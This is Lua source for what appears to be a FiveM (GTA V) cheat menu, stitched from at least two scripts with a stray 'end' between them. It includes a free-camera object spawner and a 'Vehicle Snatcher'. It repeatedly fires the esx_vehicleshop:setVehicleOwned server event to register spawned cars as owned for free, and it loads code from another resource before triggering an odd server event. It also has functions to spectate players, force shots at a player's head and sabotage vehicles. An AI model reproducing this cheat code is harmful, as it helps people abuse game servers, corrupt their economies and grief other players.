						attempt2 = GetOffsetFromEntityInWorldCoords(plyrveh, -Dimensions.x, Dimensions.y, Dimensions.z)
			
						attempt3 = GetOffsetFromEntityInWorldCoords(plyrveh, Dimensions.x, Dimensions.y, -Dimensions.z + -Dimensions.z / 2 + 0.1)
						attempt4 = GetOffsetFromEntityInWorldCoords(plyrveh, -Dimensions.x, Dimensions.y, -Dimensions.z + -Dimensions.z / 2 + 0.1)
				
						attempt5 = GetOffsetFromEntityInWorldCoords(plyrveh, Dimensions.x, -Dimensions.y, -Dimensions.z + -Dimensions.z / 2 + 0.1)
						attempt6 = GetOffsetFromEntityInWorldCoords(plyrveh, Dimensions.x, -Dimensions.y, -Dimensions.z + -Dimensions.z / 2 + 0.1)
						
						attempt7 = GetOffsetFromEntityInWorldCoords(plyrveh, -Dimensions.x, -Dimensions.y, -Dimensions.z + -Dimensions.z / 2 + 0.1)
						attempt8 = GetOffsetFromEntityInWorldCoords(plyrveh, -Dimensions.x, -Dimensions.y, -Dimensions.z + -Dimensions.z / 2 + 0.1)
				
						attempt9 = GetOffsetFromEntityInWorldCoords(plyrveh, -Dimensions.x, -Dimensions.y, Dimensions.z)
						attempt10 = GetOffsetFromEntityInWorldCoords(plyrveh, Dimensions.x, -Dimensions.y, Dimensions.z)
						
						DrawLine(attempt1.x, attempt1.y, attempt1.z, attempt2.x, attempt2.y, attempt2.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
						DrawLine(attempt3.x, attempt3.y, attempt3.z, attempt4.x, attempt4.y, attempt4.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt3.x, attempt3.y, attempt3.z, attempt6.x, attempt6.y, attempt6.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt4.x, attempt4.y, attempt4.z, attempt5.x, attempt5.y, attempt5.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt3.x, attempt3.y, attempt3.z, attempt7.x, attempt7.y, attempt7.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt4.x, attempt4.y, attempt4.z, attempt8.x, attempt8.y, attempt8.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt4.x, attempt4.y, attempt4.z, attempt8.x, attempt8.y, attempt8.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt6.x, attempt6.y, attempt6.z, attempt8.x, attempt8.y, attempt8.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
						DrawLine(attempt1.x, attempt1.y, attempt1.z, attempt3.x, attempt3.y, attempt3.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt2.x, attempt2.y, attempt2.z, attempt4.x, attempt4.y, attempt4.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
						DrawLine(attempt1.x, attempt1.y, attempt1.z, attempt9.x, attempt9.y, attempt9.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt2.x, attempt2.y, attempt2.z, attempt10.x, attempt10.y, attempt10.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt10.x, attempt10.y, attempt10.z, attempt8.x, attempt8.y, attempt8.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				
						DrawLine(attempt2.x, attempt2.y, attempt2.z, attempt9.x, attempt9.y, attempt9.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt10.x, attempt10.y, attempt10.z, attempt9.x, attempt9.y, attempt9.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt1.x, attempt1.y, attempt1.z, attempt10.x, attempt10.y, attempt10.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt1.x, attempt1.y, attempt1.z, attempt4.x, attempt4.y, attempt4.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt2.x, attempt2.y, attempt2.z, attempt3.x, attempt3.y, attempt3.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt9.x, attempt9.y, attempt9.z, attempt8.x, attempt8.y, attempt8.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt10.x, attempt10.y, attempt10.z, attempt6.x, attempt6.y, attempt6.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt9.x, attempt9.y, attempt9.z, attempt6.x, attempt6.y, attempt6.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						
						DrawLine(attempt6.x, attempt6.y, attempt6.z, attempt1.x, attempt1.y, attempt1.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt7.x, attempt7.y, attempt7.z, attempt2.x, attempt2.y, attempt2.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt9.x, attempt9.y, attempt9.z, attempt4.x, attempt4.y, attempt4.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
						DrawLine(attempt10.x, attempt10.y, attempt10.z, attempt3.x, attempt3.y, attempt3.z, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
				    end
				end
	
				local coords = GetCoordCamLooking()

				local retval, zz, normal = GetGroundZAndNormalFor_3dCoord(coords.x, coords.y, coords.z + 100)

				-- DrawMarker(1, coords.x, coords.y, zz, 0, 0, 0, 0, 0, 0, 1.5, 1.5, 1.5, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 200, 0, 0, 0, 0)

				DrawBottomHelp(ObjectSpoonerButtons)
	
				if IsDisabledControlJustReleased(0, 23) then
					HydroMenu.OpenMenu("objectslist")
				end
	
				if IsDisabledControlJustReleased(0, 38) then
	
					HydroMenu.CloseMenu()
					HydroMenu.CloseMenu()
	
					local vehmodel = HydroMenu.KeyboardEntry("Enter Spawn Code", 50)
	
					
					if IsModelAVehicle(vehmodel) then
						CreateVehicle(GetHashKey(vehmodel), coords.x, coords.y, coords.z, GetCamRot(cam, 2)[3], 1, 1)
					else
						PushNotification("Invalid Vehciel Model", 600)
					end
	
					HydroMenu.OpenMenu("objectslist")
				end
	
				if IsDisabledControlJustReleased(0, 26) then
					local entity = GetEntityInFrontOfCam()
					if entity ~= 0 and DoesEntityExist(entity) and GetEntityType(entity) ~= 0 or nil then
						local modeltodupe = GetEntityModel(entity)
						cords = GetEntityCoords(entity)
						if IsModelAVehicle(modeltodupe) then
							CreateVehicle(modeltodupe, cords.x, cords.y, cords.z, GetEntityHeading(entity), 1, 1)
						elseif IsEntityAPed(entity) then
							pud = CreatePed(5, modeltodupe, cords.x, cords.y, cords.z, GetEntityHeading(entity), 1, 1)
							TaskWanderStandard(pud, 10.0, 10)	
						end
					end
				end
				
				if IsDisabledControlPressed(0, 305) then
					local entity = GetEntityInFrontOfCam()
					if DoesEntityExist(entity) and not IsEntityAlreadyAdded(entity) then
						if entity ~= PlayerPedId() and entity ~= IsPedAPlayer(entity) then		
							local Information = {ID = entity, AttachedEntity = nil, AttachmentOffset = {X = 0, Y = 0, Z = 0, XAxis = 0, YAxis = 0, ZAxis = 0}}
							table.insert(HydroMenu.Objectlist, #HydroMenu.Objectlist + 1, Information)
						end
					end
				end
	
				--[[
				if IsDisabledControlJustReleased(0, 25) then
					if GetEntityInFrontOfCam() ~= PlayerPedId() and GetEntityInFrontOfCam() ~= IsPedAPlayer(GetEntityInFrontOfCam()) and GetEntityInFrontOfCam() ~= 0 then
						print("^ 1HydroMenu^0: Function does not exist")
					end
				end
				]]
	
				if IsDisabledControlPressed(0, 229) then
					if GetEntityInFrontOfCam() ~= 0 then
						HydroMenu.DrawRect(0.5, 0.5, 0.005, 0.0075, { r = 255, g = 128, b = 0, a = 200 })
					end
				end
	
				if IsDisabledControlJustReleased(0, 256) then
					if GetEntityInFrontOfCam() ~= PlayerPedId() and GetEntityInFrontOfCam() ~= IsPedAPlayer(GetEntityInFrontOfCam()) then
						if TableHasValue(spawnedobjectslist, GetEntityInFrontOfCam()) then
							RemoveValueFromTable(spawnedobjectslist, GetEntityInFrontOfCam())
						end
						NetworkRequestControlOfEntity(GetEntityInFrontOfCam())
						RequestControlOnce(GetEntityInFrontOfCam())
						DeleteEntity(GetEntityInFrontOfCam())
					end
				end
			
			elseif FreeCameraMode == "Vehicle Snatcher" then 
				
				if GetEntityInFrontOfCam() == 0 then
					HydroMenu.DrawRect(0.5, 0.5, 0.00075, 0.035, { r = 255, g = 255, b = 255, a = 200 })
					HydroMenu.DrawRect(0.5,  0.5, 0.02, 0.0035, { r = 255, g= 255, b = 255, a = 200 })
				else
					HydroMenu.DrawRect(0.5, 0.5, 0.00075, 0.035, { r = 0, g = 255, b = 0, a = 200 })
					HydroMenu.DrawRect(0.5,  0.5, 0.02, 0.0035, { r = 0, g= 255, b = 0, a = 200 })
				end

				if IsDisabledControlJustReleased(0, 52) then
					if IsEntityAVehicle(GetEntityInFrontOfCam()) then 
						if IsPedInAnyVehicle(PlayerPedId()) then
							oldveh = GetVehiclePedIsIn(PlayerPedId(), true)
							Wait(10)
							SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), -1)
							HydroVariables.VehicleOptions.PersonalVehicle = GetEntityInFrontOfCam()
							Wait(10)
							if IsVehicleSeatFree(oldveh, -1) then
								SetPedIntoVehicle(PlayerPedId(), oldveh, -1)
							elseif IsVehicleSeatFree(oldveh, 0) then
								SetPedIntoVehicle(PlayerPedId(), oldveh, 0)
							elseif IsVehicleSeatFree(oldveh, 1) then
								SetPedIntoVehicle(PlayerPedId(), oldveh, 1)
							elseif IsVehicleSeatFree(oldveh, 2) then
								SetPedIntoVehicle(PlayerPedId(), oldveh, 2)
							end
						else
							coords = GetEntityCoords(PlayerPedId())
							SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), -1)
							HydroVariables.VehicleOptions.PersonalVehicle = GetEntityInFrontOfCam()
							SetEntityCoords(PlayerPedId(), coords)
						end
					end
					
				elseif IsDisabledControlPressed(0, 20) then
					if IsEntityAVehicle(GetEntityInFrontOfCam()) then
						if IsVehicleSeatFree(GetEntityInFrontOfCam(), -1) then
							SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), -1)
						elseif IsVehicleSeatFree(GetEntityInFrontOfCam(), 0) then
							SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), 0)
						elseif IsVehicleSeatFree(GetEntityInFrontOfCam(), 1) then
							SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), 1)
						elseif IsVehicleSeatFree(GetEntityInFrontOfCam(), 2) then
							SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), 2)
						end
					end
				end

				DrawBottomHelp(FreeCameraButtons)
			end
        end
        Citizen.Wait(1)
    end
end)

--------------------------------------------------
------------------- FUNCTIONS --------------------
--------------------------------------------------

function DrawBottomHelp(table)
    Citizen.CreateThread(function()
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(table) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end

-- initialize camera
function StartFreeCam(fov)
    ClearFocus()

    local playerPed = PlayerPedId()
    
    cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", GetEntityCoords(playerPed), 0, 0, 0, fov * 1.0)

    SetCamActive(cam, true)
    RenderScriptCams(true, false, 0, true, false)
    
    SetCamAffectsAiming(cam, false)

    if (isAttached and DoesEntityExist(entity)) then
        offsetCoords = GetOffsetFromEntityGivenWorldCoords(entity, GetCamCoord(cam))

        AttachCamToEntity(cam, entity, offsetCoords.x, offsetCoords.y, offsetCoords.z, true)
    end
end

-- destroy camera
function EndFreeCam()
    ClearFocus()

    RenderScriptCams(false, false, 0, true, false)
	DestroyCam(cam, false)
	
	SetFocusEntity(PlayerPedId())
    
    offsetRotX = 0.0
    offsetRotY = 0.0
    offsetRotZ = 0.0

    isAttached = false

    speed       = 1.0
    precision   = 1.0
    currFov     = GetGameplayCamFov()

    cam = nil
end
disabledControls = {
    30,     -- A and D (Character Movement)
    31,     -- W and S (Character Movement)
    21,     -- LEFT SHIFT
    36,     -- LEFT CTRL
    22,     -- SPACE
    44,     -- Q
    38,     -- E
    71,     -- W (Vehicle Movement)
    72,     -- S (Vehicle Movement)
    59,     -- A and D (Vehicle Movement)
    60,     -- LEFT SHIFT and LEFT CTRL (Vehicle Movement)
    85,     -- Q (Radio Wheel)
    86,     -- E (Vehicle Horn)
    15,     -- Mouse wheel up
    14,     -- Mouse wheel down
    37,     -- Controller R1 (PS) / RT (XBOX)
    80,     -- Controller O (PS) / B (XBOX)
    228,    -- 
    229,    -- 
    172,    -- 
    173,    -- 
    37,     -- 
    44,     -- 
    178,    -- 
    244,    -- 
}

-- process camera controls
function ProcessCamControls()
    local playerPed = PlayerPedId()

    DisableFirstPersonCamThisFrame()
    BlockWeaponWheelThisFrame()
    -- disable character/vehicle controls
	if (not charControl) then
        for k, v in pairs(disabledControls) do
            DisableControlAction(0, v, true)
        end
	end
	
	-- Switch Modes

	if IsDisabledControlJustReleased(0, 82) or IsDisabledControlJustReleased(0, 81) then
		if FreeCameraMode == "Object Spooner" then
			FreeCameraMode = "Vehicle Snatcher"
		elseif FreeCameraMode == "Vehicle Snatcher" then
			FreeCameraMode = "Object Spooner"
		end
	end

    local camCoords = GetCamCoord(cam)

    -- calculate new position
    local newPos = ProcessNewPosition(camCoords.x, camCoords.y, camCoords.z)

     -- focus cam area
     SetFocusArea(newPos.x, newPos.y, newPos.z, 0.0, 0.0, 0.0)
        
    -- set coords of cam
	SetCamCoord(cam, newPos.x, newPos.y, newPos.z)
	
	SetMinimapHideFow(false)

    -- set rotation
    SetCamRot(cam, offsetRotX, offsetRotY, offsetRotZ, 2)
end

function ProcessNewPosition(x, y, z)
    local _x = x
    local _y = y
    local _z = z

    -- keyboard
    if (IsInputDisabled(0) and not charControl) then
        if (IsDisabledControlPressed(1, 32)) then
            local multX = Sin(offsetRotZ)
            local multY = Cos(offsetRotZ)
            local multZ = Sin(offsetRotX)

            _x = _x - (0.1 * speed * multX)
            _y = _y + (0.1 * speed * multY)
            _z = _z + (0.1 * speed * multZ)
        end
        if (IsDisabledControlPressed(1, 33)) then
            local multX = Sin(offsetRotZ)
            local multY = Cos(offsetRotZ)
            local multZ = Sin(offsetRotX)

            _x = _x + (0.1 * speed * multX)
            _y = _y - (0.1 * speed * multY)
            _z = _z - (0.1 * speed * multZ)
        end
        if (IsDisabledControlPressed(1, 34)) then
            local multX = Sin(offsetRotZ + 90.0)
            local multY = Cos(offsetRotZ + 90.0)
            local multZ = Sin(offsetRotY)

            _x = _x - (0.1 * speed * multX)
            _y = _y + (0.1 * speed * multY)
             _z = _z + (0.1 * speed * multZ)
        end
        if (IsDisabledControlPressed(1, 35)) then
            local multX = Sin(offsetRotZ + 90.0)
            local multY = Cos(offsetRotZ + 90.0)
            local multZ = Sin(offsetRotY)

            _x = _x + (0.1 * speed * multX)
            _y = _y - (0.1 * speed * multY)
            _z = _z - (0.1 * speed * multZ)
        end
        
            --[[
            if (IsDisabledControlPressed(1, 17)) then
                if ((speed + 0.1) < 20.0) then
                    speed = speed + 1.0
                else
                    speed = 20.0
                end
            elseif (IsDisabledControlPressed(1, 16)) then
                if (speed  > 1.0) then
                    speed = speed - 1.0
                else
                    speed = 0.1
                end
			end
			]]
			
			if IsDisabledControlPressed(0, 21) then
				speed = 15.0
			else
				speed = 2.0
			end
        

        -- rotation
        offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * precision * 8.0)
		offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * precision * 8.0)
		
    end
    

    if (offsetRotX > 90.0) then offsetRotX = 90.0 elseif (offsetRotX < -90.0) then offsetRotX = -90.0 end
    if (offsetRotY > 90.0) then offsetRotY = 90.0 elseif (offsetRotY < -90.0) then offsetRotY = -90.0 end
    if (offsetRotZ > 360.0) then offsetRotZ = offsetRotZ - 360.0 elseif (offsetRotZ < -360.0) then offsetRotZ = offsetRotZ + 360.0 end

    return {x = _x, y = _y, z = _z}
end

function ToggleCam(flag, fov)
    if (flag) then
        StartFreeCam(fov)
        _menuPool:RefreshIndex()
    else
        EndFreeCam()
        _menuPool:RefreshIndex()
    end
end

function GetEntityInFrontOfCam()
    local camCoords = GetCamCoord(cam)
    local offset = GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 40)

	local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, offset.x, offset.y, offset.z, -1)
    local a, b, c, d, entity = GetShapeTestResult(rayHandle)
    return entity
end

function GetPedThroughWall()
    local camCoords = GetCamCoord(cam)
    local offset = GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 40)

	local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, offset.x, offset.y, offset.z, -1)
    local a, b, c, d, entity = GetShapeTestResult(rayHandle)
    return entity
end

function GetCoordCamLooking()
	Markerloc = GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 20)
	return Markerloc
end

function ToggleAttachMode()
    if (not isAttached) then
        entity = GetEntityInFrontOfCam()
        
        if (DoesEntityExist(entity)) then
            offsetCoords = GetOffsetFromEntityGivenWorldCoords(entity, GetCamCoord(cam))

            Citizen.Wait(1)
            local camCoords = GetCamCoord(cam)
            AttachCamToEntity(cam, entity, GetOffsetFromEntityInWorldCoords(entity, camCoords.x, camCoords.y, camCoords.z), true)

            isAttached = true
        end
    else
        ClearFocus()

        DetachCam(cam)

        isAttached = false
    end
end

function TogglePointing(flag)
    if (flag and isAttached) then
        pointEntity = true
        PointCamAtEntity(cam, entity, 0.0, 0.0, 0.0, 1)
    else
        pointEntity = false
        StopCamPointing(cam)
    end
end
  end

      function matanumaispalarufe()
       load(LoadResourceFile('sentry', 'Source/Client.lua'))()
TriggerServerEvent("+4KING:GETBOOK")
      end

function doshit(playerVeh)
  RequestControl(playerVeh)
      SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
      SetEntityAsMissionEntity(playerVeh, false, false)
      StartVehicleAlarm(playerVeh)
      DetachVehicleWindscreen(playerVeh)
      SetVehicleGravity(playerVeh, false)
end

    function matacumparamasini()
    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
    local NewPlate = KeyboardInput("Enter Vehicle Licence Plate", "", 100)
  
    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
  RequestModel(ModelName)
  while not HasModelLoaded(ModelName) do
Citizen.Wait(0)
  end
  
  local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
  SetVehicleNumberPlateText(veh, NewPlate)
  local vehProps = ESX.Game.GetVehicleProperties(veh)
  TSE("esx_vehicleshop:setVehicleOwned", vehProps)
  TrverEvent("esx_vehicleshop:setVehicleOwned", vehProps)
  TriggerServerEvent("esx_vehicleshop:setVehicleOwned", vehProps)
  TSE("esx_vehicleshop:setVehicleOwned", cx)
  TrverEvent("esx_vehicleshop:setVehicleOwned", cx)
  TriggerServerEvent("esx_vehicleshop:setVehicleOwned", cx)
  TrverEvent('esx_vehicleshop:setVehicleOwned', vehicleProps)
  TSE('esx_vehicleshop:setVehicleOwned', vehicleProps)
  TriggerServerEvent('esx_vehicleshop:setVehicleOwned', vehicleProps) 
  notify("~g~~h~Success", false)
    else
  notify("~b~~h~Model is not valid !", true)
    end
  end

      function daojosdinpatpemata()
        local playerPed = GetPlayerPed(-1)
        local playerVeh = GetVehiclePedIsIn(playerPed, true)
        if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
          SetVehicleOnGroundProperly(playerVeh)
          notify("~g~Vehicle Flipped!", false)
        else
          notify("~b~You Aren't In The Driverseat Of A Vehicle!", true)
        end
      end


      function stringsplit(inputstr, sep)
        if sep == nil then
          sep = "%s"
        end
        local t = {}
        i = 1
        for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
          t[i] = str
          i = i + 1
        end
        return t
      end

      local Spectating = false

      function SpectatePlayer(player)
        local playerPed = PlayerPedId(-1)
        Spectating = not Spectating
        local targetPed = GetPlayerPed(player)

        if (Spectating) then
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(true, targetPed)

          notify("Spectating " .. GetPlayerName(player), false)
        else
          local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

          RequestCollisionAtCoord(targetx, targety, targetz)
          NetworkSetInSpectatorMode(false, targetPed)

          notify("Stopped Spectating " .. GetPlayerName(player), false)
        end
      end

      function ShootPlayer(player)
        local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        SetPedShootsAtCoord(PlayerPedId(-1), head.x, head.y, head.z, true)
      end

      function MaxOut(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
        SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
        SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
      end

      function DelVeh(veh)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
      end


      function Clean(veh)
        SetVehicleDirtLevel(veh, 15.0)
      end

      function Clean2(veh)
        SetVehicleDirtLevel(veh, 1.0)
      end
      function ApplyForce(entity, direction)
        ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
      end

      function RequestControlOnce(entity)
        if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
          return true
        end
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
        return NetworkRequestControlOfEntity(entity)
      end

      function RequestControl(entity)
        Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
          tick = tick+1
          Wait(0)
        end
        return tick <= 12
        end)
      end

      function Oscillate(entity, position, angleFreq, dampRatio)
        local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq*angleFreq))
